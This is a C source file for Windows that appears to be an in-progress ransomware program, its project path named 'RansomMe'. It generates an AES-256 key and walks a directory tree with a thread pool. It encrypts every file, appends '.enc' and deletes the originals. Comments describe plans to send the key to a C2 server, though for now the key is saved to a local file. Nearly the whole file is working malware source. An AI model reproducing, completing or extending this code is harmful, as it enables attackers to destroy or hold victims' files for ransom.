#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <strsafe.h>

#pragma comment(lib, "Advapi32.lib")

// Constants
#define CHUNK_SIZE 4096         // files will be encrypted in chunks of this size
#define MAX_THREADS 8           // max number of threads
#define MIN_THREADS 1           // min number of threads

// Struct with all the parameters to be passed to the FileEncryptWorker callback function
typedef struct {
    char filePath[MAX_PATH];            // path of the file to be encrypted
    const char* cryptoFileExt;          // extension to be appended to the encrypted file
    HCRYPTKEY hKey;                     // encryption key
    HANDLE available;                   // signal to tell the WaitForSingleObject function that the struct is available (not being used by other thread)
    BOOL success;                       // true if the file was successfully encrypted
} FileEncryptTask;


// Declairing the EncryptMyFile function to use it in the FileEncryptWorker callback function
BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey);

// The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
    UNREFERENCED_PARAMETER(instance);                               // instance will not be used
    UNREFERENCED_PARAMETER(work);                                   // work will not be used
    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct

    // Call EncryptMyFile with the file name, extension and encryption key
    if (EncryptMyFile(taskParam->filePath, taskParam->cryptoFileExt, taskParam->hKey)) {
        taskParam->success = TRUE;          // only if the encryption succeeded
    }

    taskParam->filePath[0] = '\0';          // clear the file name (this is optional)
    SetEvent(taskParam->available);         // set the struct as available
    return;
}

// initialize the threadpool, poolEnv will point to the pool environment and cleanupgroup to the cleanup group handler
BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgroup) {
    PTP_POOL pool = NULL;       // the pool pointer used in CreateThreadPool

    // Create thread pool   
    pool = CreateThreadpool(NULL);
    if (!pool) {
        printf("Error: Failed to create thread pool. Error Code: %lu\n", GetLastError());
        return FALSE;
    }

    // Create thread pool environment
    InitializeThreadpoolEnvironment(poolEnv);
    SetThreadpoolThreadMaximum(pool, MAX_THREADS); // Set maximum threads

    // Set minimum threads
    if (!SetThreadpoolThreadMinimum(pool, MIN_THREADS)) {
        printf("SetThreadpoolThreadMinimum failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Create a cleanup group
    *cleanupgroup = CreateThreadpoolCleanupGroup();
    if (cleanupgroup == NULL) {
        printf("CreateThreadpoolCleanupGroup failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Associate the callback environment with our thread pool.
    SetThreadpoolCallbackPool(poolEnv, pool);

    // Associate the cleanup group with our thread pool.
    // Objects created with the same callback environment
    // as the cleanup group become members of the cleanup group.
    SetThreadpoolCallbackCleanupGroup(poolEnv, *cleanupgroup, NULL);

    return TRUE;
}

// Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey) {
    // Acquire a cryptographic provider context to use AES symmetric encryption
    if (!CryptAcquireContext(hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error: CryptAcquireContext failed. Error Code: %lu\n", GetLastError());
        return FALSE;
    }
    // Generate a key for the provider using the CALG_AES_256
    if (!CryptGenKey(*hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, hKey))
    {
        printf("Error: CryptGenKey failed. Error Code: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// I had to build my own strcat function to handle with the runtime exception thrown when
//      appending a string to a big enough string and overflowing the MaxSize
errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr) {
    if (strlen(destinationStr) + strlen(sourceStr) > MaxSize) {
        return -1;
    }
    else {
        return strncat_s(destinationStr, MaxSize, sourceStr, strlen(sourceStr));
    }
}

// This just gets a timestamp
void GetTime (ULARGE_INTEGER* time) {
    FILETIME fTime;

    // Get the time
    GetSystemTimeAsFileTime(&fTime);
    time->LowPart = fTime.dwLowDateTime;
    time->HighPart = fTime.dwHighDateTime;

    return;
}

// this saves the key into a file, I want to change this to encrypt and send to a web server
void PrintKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
    DWORD keyBlobSize = 0;
    BYTE* keyBlob = NULL;
    FILE* file = NULL;
    const char* fileName = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin";

    // Get the size of the key blob
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        return;
    }

    // Allocate memory for the key blob
    keyBlob = (BYTE*)malloc(keyBlobSize);
    if (!keyBlob) {
        printf("Error: Memory allocation failed.\n");
        return;
    }

    // Export the key into the blob
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        free(keyBlob);
        return;
    }

    file = fopen(fileName, "wb");
    if (!file) {
        printf("Error: Failed to open file %s for writing.\n", fileName);
        free(keyBlob);
        return;
    }

    // Write the key blob to the file
    if (fwrite(keyBlob, 1, keyBlobSize, file) != keyBlobSize) {
        printf("Error: Failed to write the full key blob to file.\n");
    }
    else {
        printf("Key successfully saved to %s\n", fileName);
    }

    // Clean up
    fclose(file);
    free(keyBlob);
}

// This function gets a file name, extension and key and creates an encrypted version with the new extension appended and removes the original file
BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
    HANDLE hInputFile = INVALID_HANDLE_VALUE;       // input file handler
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;      // output file handler

    BYTE buffer[CHUNK_SIZE];                   // buffer to read from file, encrypt and write into file
    DWORD bytesRead = 0, bytesWritten = 0;          // number of bytes read/written return by CreateFile and CryptEncrypt
    BOOL finalChunk = FALSE;                        // flag to tell CryptEncrypt that it is the final chunk (smaller than the rest)
    BOOL success = FALSE;                           // flag to return success/failure

    char outputFileName[MAX_PATH] = "";             // output file name

    // the output file will be the original file plus the crypted extension appended
    strcpy_s(outputFileName, MAX_PATH, inputFileName);
    if (my_strcat_s(outputFileName, MAX_PATH, cryptoFileExt) != 0) {
        printf("Cannot append the crypted extension to file name %s.\n", outputFileName);
        goto cleanup;
    }

    // Open the input file
    hInputFile = CreateFileA(inputFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open input file %s. Error Code: %lu\n", inputFileName, GetLastError());
        goto cleanup;
    }

    // Open the output file
    hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open output file %s. Error Code: %lu\n", outputFileName, GetLastError());
        goto cleanup;
    }

    // Encrypt and write the file data in chunks
    while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE
        // Encrypt the chunk
        if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
            printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
            printf("Failure encrypting file %s\n", inputFileName);
            goto cleanup;
        }

        // Write the encrypted chunk to the output file
        if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
            printf("Failure writing to file %s\n", outputFileName);
            goto cleanup;
        }
    }

    // set success to true because the encryption went ok
    success = TRUE;
//    printf("\rFile %s encrypted successfully.", inputFileName);
//    fflush(stdout);

cleanup:
    // Release the file handlers
    if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
    if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);

    // Delete the input file only if the decryption was successful
    if (success == TRUE) {
        if (!DeleteFileA(inputFileName)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", inputFileName, GetLastError());
        }
    }

    return success;
}

// given a target directory this will crawl into it and call EncryptMyFile for every file found on it and its subdirectories
size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile

    size_t fileCount = 0;                    // number of files found

    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile

    PTP_WORK work = NULL;
    FileEncryptTask* task = NULL;

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }
    
    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += EncryptAllFiles(targetSubDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);
        }
        else {
            // If it's a file, encrypt it
            // Point the next available struct to task. A round robin is used with fileCount % MAX_THREADS
            task = &taskPool[fileCount % MAX_THREADS];
            // Block until the event is signaled
            WaitForSingleObject(task->available, INFINITE);
            
            // Add 1 to the encrypted file count if the previous one returned success
            if (task->success) { (*encryptedFileNumber)++; }

            // Mark the task as in-use by resetting the event
            ResetEvent(task->available);

            // Copy the current dir and append the found file name to task->filePath
            strcpy_s(task->filePath, MAX_PATH, targetDir);
            if (my_strcat_s(task->filePath, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                continue;
            }

            // Submit the task to the thread pool
            work = CreateThreadpoolWork(FileEncryptWorker, task, poolEnv);
            if (!work) {
                printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                SetEvent(task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the work
            SubmitThreadpoolWork(work);
            
            fileCount++;
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);

    // Return the total files found
    return fileCount;
}

// this will initialize the FileEncryptTask structs and call EncryptAllFiles. Finally it will securely close the thread handlers and finish up the encrypted files count
static size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup) {
    size_t fileCount = 0;
    FileEncryptTask taskPool[MAX_THREADS] = { 0 };

    for (int i = 0; i < MAX_THREADS; i++) {
        taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
        taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
        taskPool[i].hKey = hKey;                                        // the encryption key
        taskPool[i].success = FALSE;                                    // initialize success as false, this will be used to count the total encrypted files

        // Setup an event to tell WaitForSingleObject when a struct is available
        taskPool[i].available = CreateEvent(NULL, TRUE, TRUE, NULL);    // Manual reset, initially signaled
        if (!taskPool[i].available) {
            printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
            return 0;
        }
    }

    fileCount = EncryptAllFiles(targetDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);

    // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
    if (cleanupgroup) {
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
    }

    // Add the results from the last task of each thread
    for (int i = 0; i < MAX_THREADS; i++) {
        if (taskPool[i].success) { (*encryptedFileNumber)++; }
    }

    return fileCount;
}


int main() {
// this will be command parameters later
    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test\\a";
//    char inputFileName[MAX_PATH] = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\test.txt";
//    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test";
    const char* cryptoFileExt = ".enc";

//------------- LOCAL VARIABLES -------------------------------------------------
    // general purpose variables
    size_t totalFileNumber = 0;                     // number of files found
    size_t encryptedFileNumber = 0;                 // number of encrypted files
    ULARGE_INTEGER start, end;                      // start time and end time to measure performance

    // thread pool variables
    TP_CALLBACK_ENVIRON poolEnv;               // a pool environment struct to handle the thread pool
    PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool

    // encryption variables
    HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
    HCRYPTKEY hKey = 0;                             // handler for the encryption key

//------------- INIT AND EXECUTE --------------------------------------------------
    // Initialize the thread pool. This will create a thread pool and a cleanup group
    //   and will link them to the same pool environment handler
    if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
        printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
        return 0;
    }
   
    // Initialize the crypto environment. This will acquire a context and generate a key
    if (!InitCrypto(&hCryptProv, &hKey)) {
        printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
        return 0;
    }

    // print the key to a file (this will change to encrypt the key and send it to a C2 server
    PrintKey(hCryptProv, hKey);

    // start the timer
    GetTime(&start);

    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &poolEnv, cleanupgroup);
    
    // end the time    
    GetTime(&end);

    printf("%zd files found.\n", totalFileNumber);
    printf("%zd files encrypted.\n", encryptedFileNumber);
    
    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

//------------- CLEAN UP --------------------------------------------------------
    // Release the encryption key
    if (hKey) {
        if (!(CryptDestroyKey(hKey))) {
            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
        }
    }
    // Release the crypto provider handle.
    if (hCryptProv) {
        if (!(CryptReleaseContext(hCryptProv, 0))) {
            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
        }
    }

    return 0;
}
